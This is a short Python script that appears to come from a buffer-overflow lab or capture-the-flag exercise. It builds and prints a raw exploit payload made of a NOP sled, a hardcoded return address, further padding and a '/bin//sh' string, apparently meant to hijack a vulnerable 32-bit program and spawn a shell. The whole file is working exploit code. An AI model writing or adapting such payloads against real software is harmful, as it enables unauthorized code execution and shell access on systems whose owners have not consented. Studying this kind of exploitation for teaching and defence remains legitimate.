import sys
import struct
from shellcode import shellcode

operate_buffer = 0x804cde0
sys.stdout.buffer.write(struct.pack('22s',b'\x90'*22)+ struct.pack('<I',operate_buffer) + struct.pack('4s',b'\x90'*4) + struct.pack('<I',0xfffe71f6+34)+struct.pack('8s',b'/bin//sh'))